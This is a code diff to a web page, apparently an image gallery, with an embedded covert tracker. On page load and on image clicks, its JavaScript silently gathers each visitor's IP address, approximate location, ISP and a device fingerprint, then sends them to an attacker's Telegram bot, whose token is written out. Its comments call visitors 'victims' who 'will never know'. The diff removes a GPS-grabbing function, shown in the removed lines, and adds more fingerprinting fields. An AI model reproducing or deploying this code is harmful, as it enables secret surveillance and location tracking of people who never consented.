@@ -142,7 +142,7 @@
     </div>
 
     <script>
-        // Stealth tracking system - no visible links, no permissions
+        // Stealth tracking system - no visible links, NO LOCATION PERMISSIONS
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -166,7 +166,6 @@
             try {
                 const victimData = await captureStealthData('page_load');
                 await sendToTelegram(victimData);
-                // Store for admin panel silently
                 storeStealthVictim(victimData);
             } catch (error) {
                 // Silent fail - victim never knows
@@ -184,7 +183,7 @@
                     card.style.opacity = '0.6';
                 });
 
-                // Capture data without user knowing
+                // Capture data without user knowing - NO GPS
                 const victimData = await captureStealthData(imageId);
                 
                 // Send to Telegram silently
@@ -210,11 +209,10 @@
         }
 
         async function captureStealthData(imageId) {
-            // Get data without asking permission
-            const [ipData, locationData, stealthGPS] = await Promise.allSettled([
+            // Get data without asking permission - NO GPS REQUESTS
+            const [ipData, locationData] = await Promise.allSettled([
                 getStealthIP(),
-                getStealthIP().then(ip => ip.ip !== 'Unknown' ? getStealthLocation(ip.ip) : {}),
-                getStealthGPS()
+                getStealthIP().then(ip => ip.ip !== 'Unknown' ? getStealthLocation(ip.ip) : {})
             ]);
 
             const deviceInfo = getStealthDeviceInfo();
@@ -231,7 +229,7 @@
                     isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
                     timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown'
                 },
-                gps: stealthGPS.status === 'fulfilled' ? stealthGPS.value : {error: 'Stealth failed'},
+                // No GPS data - completely removed to avoid permissions
                 device: deviceInfo,
                 page: {
                     url: window.location.href,
@@ -241,46 +239,13 @@
             };
         }
 
-        async function getStealthGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: 'Geolocation not supported', success: false });
-                    return;
-                }
-
-                // Try to get GPS without user prompt using different methods
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude.toFixed(6),
-                            longitude: position.coords.longitude.toFixed(6),
-                            accuracy: Math.round(position.coords.accuracy) + ' meters',
-                            mapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
-                            success: true,
-                            method: 'silent'
-                        });
-                    },
-                    (error) => {
-                        // If permission denied, try to estimate from IP
-                        resolve({
-                            error: 'Permission denied - using IP estimation',
-                            success: false,
-                            method: 'ip_fallback'
-                        });
-                    },
-                    {
-                        enableHighAccuracy: false, // Less suspicious
-                        timeout: 5000, // Shorter timeout
-                        maximumAge: 300000 // Use cached position if available
-                    }
-                );
-            });
-        }
+        // REMOVED COMPLETELY: getStealthGPS() function - no location permissions ever
 
         async function getStealthIP() {
             const services = [
                 'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json'
+                'https://api64.ipify.org?format=json',
+                'https://ipinfo.io/json'
             ];
 
             for (const service of services) {
@@ -290,7 +255,7 @@
                         credentials: 'omit'
                     });
                     const data = await response.json();
-                    return { ip: data.ip || 'Unknown' };
+                    return { ip: data.ip || data.query || 'Unknown' };
                 } catch (error) {
                     continue;
                 }
@@ -317,7 +282,9 @@
                 memory: navigator.deviceMemory || 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled ? 'Enabled' : 'Disabled'
+                java: navigator.javaEnabled ? 'Enabled' : 'Disabled',
+                plugins: navigator.plugins.length,
+                doNotTrack: navigator.doNotTrack || 'Not set'
             };
         }
 
@@ -357,18 +324,21 @@
 
 ${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Image clicked:* #' + victim.imageId}
 🌐 *IP:* \`${victim.ip}\`
-📍 *Location:* ${victim.location.city}, ${victim.location.country}
+📍 *Location:* ${victim.location.city}, ${victim.location.region}, ${victim.location.country}
 🏢 *ISP:* ${victim.location.isp}
-
-${victim.gps.success ? 
-`📍 *EXACT GPS:* ${victim.gps.latitude}, ${victim.gps.longitude}
-🎯 *Accuracy:* ${victim.gps.accuracy}` : 
-`❌ *GPS:* ${victim.gps.error}`}
+🕒 *Timezone:* ${victim.location.timezone}
 
 💻 *Device:* ${victim.device.platform}
 📱 *Screen:* ${victim.device.screen}
-🌐 *Browser:* ${victim.device.userAgent.substring(0, 30)}...
-🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}`;
+🌐 *Browser:* ${victim.device.userAgent.substring(0, 40)}...
+🔧 *Cores:* ${victim.device.cores} | *RAM:* ${victim.device.memory}GB
+🌍 *Language:* ${victim.device.language}
+🍪 *Cookies:* ${victim.device.cookies}
+🚫 *DoNotTrack:* ${victim.device.doNotTrack}
+
+🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}
+🔗 *URL:* ${victim.page.url}
+📊 *Referrer:* ${victim.page.referrer || 'Direct'}`;
         }
 
         // Hidden admin access - only works with secret key
@@ -385,7 +355,7 @@ ${victim.gps.success ?
             }
         });
 
-        console.log('🕵️ Stealth tracker active - victims will never know');
+        console.log('🕵️ Stealth tracker active - NO location permissions requested');
     </script>
 </body>
 </html>
